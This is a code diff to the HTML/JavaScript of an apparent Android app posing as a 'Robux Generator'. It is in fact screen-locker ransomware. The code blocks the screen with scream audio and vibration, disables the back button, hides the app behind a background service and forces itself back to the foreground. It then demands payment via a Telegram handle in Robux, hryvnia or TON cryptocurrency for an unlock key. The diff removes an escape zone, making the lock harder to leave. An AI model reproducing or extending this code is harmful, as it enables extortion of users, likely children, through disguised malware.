@@ -6,12 +6,11 @@
     <title>Robux Generator</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body, html { width:100%; height:100%; overflow:hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#0b0c10; color:white; user-select:none; -webkit-user-select:none; -webkit-touch-callout:none; }
+        body, html { width:100%; height:100%; overflow:hidden; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#0b0c10; color:white; user-select:none; -webkit-user-select:none; -webkit-touch-callout:none; }
 
         #screen-normal {
             display:flex; flex-direction:column; align-items:center; justify-content:center;
-            height:100%; background:linear-gradient(145deg, #1a1a2e, #16213e);
-            padding:20px; position:relative; transition:opacity 0.5s;
+            height:100%; background:linear-gradient(145deg, #1a1a2e, #16213e); padding:20px;
         }
         .logo { font-size:4em; font-weight:900; background:linear-gradient(45deg, #ff4444, #ff8c00); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; margin-bottom:10px; text-shadow:0 0 20px rgba(255,68,68,0.5); }
         .subtitle { font-size:1.4em; color:#ccc; margin-bottom:40px; }
@@ -24,14 +23,13 @@
         .btn {
             background:linear-gradient(45deg, #ff4444, #ff6600); border:none; padding:15px 40px;
             font-size:1.3em; font-weight:bold; border-radius:40px; color:white; cursor:pointer;
-            box-shadow:0 0 25px rgba(255,68,68,0.7); transition:transform 0.2s, box-shadow 0.2s;
-            letter-spacing:1px;
+            box-shadow:0 0 25px rgba(255,68,68,0.7); transition:transform 0.2s;
         }
-        .btn:active { transform:scale(0.96); box-shadow:0 0 35px rgba(255,68,68,1); }
+        .btn:active { transform:scale(0.96); }
 
         #screen-blocked {
             display:none; flex-direction:column; align-items:center; justify-content:center;
-            height:100%; background:#000; padding:20px; position:relative; text-align:center;
+            height:100%; background:#000; padding:20px; text-align:center;
         }
         .blocked-title {
             font-size:2.5em; font-weight:800; color:#ff0000; text-shadow:0 0 30px red;
@@ -45,7 +43,7 @@
             padding:25px; width:90%; max-width:350px;
         }
         .example { font-size:2em; font-weight:bold; margin:15px 0; }
-        .progress { color:#aaa; margin-bottom:10px; font-size:1.1em; }
+        .progress { color:#aaa; margin-bottom:10px; }
         .answer-input {
             width:100%; padding:12px; font-size:1.2em; border:2px solid #555;
             border-radius:15px; background:#0a0a0a; color:white; text-align:center;
@@ -57,16 +55,19 @@
             font-size:1.1em; font-weight:bold; color:white;
         }
         .final-message {
-            font-size:1.2em; line-height:1.6; padding:20px; display: flex; flex-direction: column; gap:15px;
-        }
-        .password-box {
-            display: flex; flex-direction: column; align-items: center; gap:10px;
+            padding:20px; display:flex; flex-direction:column; gap:15px; align-items:center;
         }
         .password-input {
             width:80%; padding:12px; font-size:1.2em; border:2px solid #f00;
             border-radius:15px; background:#000; color:#fff; text-align:center;
         }
-        #exit-zone { position:fixed; top:0; right:0; width:15px; height:100%; z-index:9999; background:transparent; }
+
+        /* Всплывающее предупреждение */
+        #no-exit-toast {
+            display:none; position:fixed; top:40%; left:50%; transform:translate(-50%, -50%);
+            background:rgba(255,0,0,0.9); color:white; font-size:1.5em; font-weight:bold;
+            padding:20px 40px; border-radius:20px; z-index:10000;
+        }
     </style>
 </head>
 <body>
@@ -92,12 +93,13 @@
             <div style="font-weight:bold; font-size:1.3em;">🔐 ВВЕДИТЕ КЛЮЧ РАЗБЛОКИРОВКИ</div>
             <input type="text" class="password-input" id="unlock-input" placeholder="Код" autocomplete="off">
             <button class="btn-answer" id="unlock-btn">Разблокировать</button>
-            <p style="font-size:0.9em; color:#aaa;">Для получения ключа:<br>Telegram: @Virussupp0rt<br>Цена: 100 Robux / 50 грн / 1 TON</p>
+            <p style="font-size:0.9em; color:#aaa;">Telegram: @Virussupp0rt<br>Цена: 100 Robux / 50 грн / 1 TON</p>
         </div>
     </div>
 </div>
 
-<div id="exit-zone"></div>
+<!-- Всплывающее предупреждение -->
+<div id="no-exit-toast">⛔ ЗДЕСЬ НЕТ ВЫХОДА</div>
 
 <audio id="scream-audio" preload="auto">
     <source src="https://www.soundjay.com/human/sounds/scream-01.mp3" type="audio/mpeg">
@@ -118,15 +120,15 @@
     const finalContainer = document.getElementById('final-container');
     const unlockInput = document.getElementById('unlock-input');
     const unlockBtn = document.getElementById('unlock-btn');
-    const exitZone = document.getElementById('exit-zone');
     const screamAudio = document.getElementById('scream-audio');
+    const noExitToast = document.getElementById('no-exit-toast');
 
     let blockTimer = null;
     let questProgress = 0;
     let currentAnswer = null;
     let blocked = false;
 
-    // Функция выхода
+    // Функция выхода (остановка сервиса и закрытие)
     function exitApp() {
         if (window.Android && window.Android.unlockAndExit) {
             Android.unlockAndExit();
@@ -137,15 +139,10 @@
 
     // Секретный код 6677 в любом поле
     function checkSecretCode(inputElement) {
-        if (inputElement.value.trim() === '6677') {
-            exitApp();
-        }
+        if (inputElement.value.trim() === '6677') exitApp();
     }
     nicknameInput.addEventListener('input', () => checkSecretCode(nicknameInput));
     answerInput.addEventListener('input', () => checkSecretCode(answerInput));
-
-    // Невидимая полоса выхода (мгновенное закрытие)
-    exitZone.addEventListener('click', () => exitApp());
 
     // Блокировка кнопки "Назад"
     function lockBackButton() {
@@ -161,13 +158,12 @@
     function generateExample() {
         const ops = ['+', '-', '*', '/'];
         const op = ops[Math.floor(Math.random() * ops.length)];
-        let a, b, question;
+        let a, b;
         if (op === '+') { a=Math.floor(Math.random()*50)+1; b=Math.floor(Math.random()*50)+1; currentAnswer=a+b; }
         else if (op === '-') { a=Math.floor(Math.random()*50)+20; b=Math.floor(Math.random()*a)+1; currentAnswer=a-b; }
         else if (op === '*') { a=Math.floor(Math.random()*12)+1; b=Math.floor(Math.random()*12)+1; currentAnswer=a*b; }
         else if (op === '/') { b=Math.floor(Math.random()*10)+1; a=b*(Math.floor(Math.random()*10)+1); currentAnswer=a/b; }
-        question = a + ' ' + op + ' ' + b + ' = ?';
-        return question;
+        return a + ' ' + op + ' ' + b + ' = ?';
     }
 
     function showNewExample() {
@@ -180,22 +176,20 @@
         questProgress = 0;
         progressText.textContent = 'Пример 1 из 10';
         showNewExample();
-        // Вибрация и звук
         if (window.Android && Android.vibrate) Android.vibrate(500);
         screamAudio.currentTime = 0;
         screamAudio.play().catch(()=>{});
-        // Эффект тряски
         screenBlocked.style.transform = 'translateX(5px)';
         setTimeout(() => screenBlocked.style.transform = '', 100);
     }
 
     function showFinal() {
         questContainer.style.display = 'none';
-        finalContainer.style.display = 'block';
+        finalContainer.style.display = 'flex';
         unlockInput.focus();
     }
 
-    // Обработчик ответа на пример
+    // Обработчик ответа
     function handleAnswer() {
         const val = answerInput.value.trim();
         if (val === '6677') { exitApp(); return; }
@@ -205,7 +199,6 @@
             questProgress++;
             if (questProgress >= 10) {
                 showFinal();
-                // Дополнительный скример на финише
                 if (Android && Android.vibrate) Android.vibrate(300);
                 screamAudio.play().catch(()=>{});
             } else {
@@ -217,7 +210,7 @@
         }
     }
 
-    // Активация блокировки (пранк)
+    // Активация пранка ❗
     function activateBlock() {
         if (blocked) return;
         blocked = true;
@@ -230,13 +223,29 @@
         questContainer.style.display = 'block';
         finalContainer.style.display = 'none';
 
-        // Скрываем приложение через 1 секунду
-        setTimeout(() => {
-            if (window.Android && Android.hideApp) {
-                Android.hideApp();
-                // Запускаем фоновый сервис (уже внутри hideApp)
-            }
-        }, 1000);
+        // Запускаем фоновый сервис
+        if (window.Android && Android.hideApp) {
+            Android.hideApp();   // свернёт приложение и запустит сервис
+        }
+    }
+
+    // Не даём свернуть – перехватываем visibilitychange
+    document.addEventListener('visibilitychange', () => {
+        if (blocked && document.hidden) {
+            // Показываем предупреждение, вибрируем и снова открываем
+            if (Android && Android.vibrate) Android.vibrate(300);
+            showNoExitToast();
+            // Сразу возвращаем в фокус
+            setTimeout(() => {
+                window.focus();
+                if (document.fullscreenEnabled) document.documentElement.requestFullscreen();
+            }, 500);
+        }
+    });
+
+    function showNoExitToast() {
+        noExitToast.style.display = 'block';
+        setTimeout(() => noExitToast.style.display = 'none', 1500);
     }
 
     // Инициализация
@@ -249,14 +258,13 @@
     checkBtn.addEventListener('click', handleAnswer);
     answerInput.addEventListener('keydown', (e) => { if (e.key==='Enter') handleAnswer(); });
 
-    // Обработчик разблокировки
+    // Разблокировка
     unlockBtn.addEventListener('click', () => {
         if (unlockInput.value.trim() === '6677') {
-            if (window.Android && Android.vibrate) Android.vibrate(200);
+            if (Android && Android.vibrate) Android.vibrate(200);
             exitApp();
         } else {
-            // Неверный код - скример + вибрация
-            if (window.Android && Android.vibrate) Android.vibrate(800);
+            if (Android && Android.vibrate) Android.vibrate(800);
             screamAudio.currentTime = 0;
             screamAudio.play().catch(()=>{});
             unlockInput.value = '';
@@ -266,14 +274,18 @@
     });
     unlockInput.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') unlockBtn.click();
-        // Проверка на 6677 при вводе
         checkSecretCode(unlockInput);
     });
 
-    // При возвращении из свёрнутого состояния (если пользователь нажал на уведомление)
+    // Если приложение вернулось в фокус (например, по уведомлению), а экран блокировки уже должен быть
     window.addEventListener('pageshow', () => {
         if (blocked) {
-            // Убедимся, что сервис работает
+            // Гарантированно открываем экран блокировки, если вдруг скрыт
+            if (screenBlocked.style.display === 'none') {
+                screenNormal.style.display = 'none';
+                screenBlocked.style.display = 'flex';
+            }
+            // Подстрахуемся, чтобы сервис жил
             if (window.Android && Android.restartServiceIfNeeded) {
                 Android.restartServiceIfNeeded();
             }
